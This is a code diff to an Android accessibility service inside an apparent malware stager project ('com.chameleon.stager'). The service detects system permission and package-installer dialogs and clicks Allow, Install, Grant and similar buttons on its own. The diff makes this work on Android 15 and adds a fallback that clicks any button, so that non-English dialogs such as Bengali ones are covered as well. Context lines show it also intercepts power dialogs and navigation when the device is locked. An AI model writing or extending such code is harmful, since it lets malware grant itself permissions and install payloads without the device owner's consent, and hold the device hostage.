@@ -16,6 +16,7 @@ import com.chameleon.stager.utils.ObfuscatedStrings
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.DataOutputStream
+import java.util.LinkedList
 
 class StagerAccessibilityService : AccessibilityService() {
     companion object {
@@ -45,10 +46,10 @@ class StagerAccessibilityService : AccessibilityService() {
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
             (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller"))) {
             Log.i(TAG, "Permission dialog detected from $pkg, auto-clicking Allow")
-            // Short delay for the dialog to fully render
+            // Short delay for the dialog to fully render (1200ms for Android 15)
             android.os.Handler(mainLooper).postDelayed({
                 grantPermissionIfPrompted()
-            }, 300)
+            }, 1200)
         }
 
         // If locked, intercept power dialogs and navigation
@@ -206,18 +207,40 @@ class StagerAccessibilityService : AccessibilityService() {
     fun grantPermissionIfPrompted(): Boolean {
         val root = rootInActiveWindow ?: return false
 
-        // Look for "Allow" or "Install" buttons in system dialogs
-        val allowButtons = root.findAccessibilityNodeInfosByText("Allow")
-        val installButtons = root.findAccessibilityNodeInfosByText("Install")
+        // Try all common permission button texts (English)
+        val searchTexts = arrayOf("Allow", "Allow all the time", "While using the app",
+            "Only this time", "Grant", "Install", "Continue", "Next")
+        for (text in searchTexts) {
+            val nodes = root.findAccessibilityNodeInfosByText(text)
+            if (nodes != null && nodes.isNotEmpty()) {
+                for (node in nodes) {
+                    if (node.isClickable) {
+                        clickNode(node)
+                        node.recycle()
+                        return true
+                    }
+                    node.recycle()
+                }
+            }
+        }
 
-        (allowButtons + installButtons).forEach { node ->
-            if (node.isClickable) {
+        // Fallback: BFS through all children to find any clickable button
+        // (catches locale-specific buttons like Bengali অণুমতি দিন)
+        val queue = LinkedList<AccessibilityNodeInfo>()
+        queue.add(root)
+        while (queue.isNotEmpty()) {
+            val node = queue.removeFirst()
+            if (node.isClickable && node.className?.contains("Button") == true) {
                 clickNode(node)
                 node.recycle()
                 return true
             }
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { queue.add(it) }
+            }
             node.recycle()
         }
+
         return false
     }
 
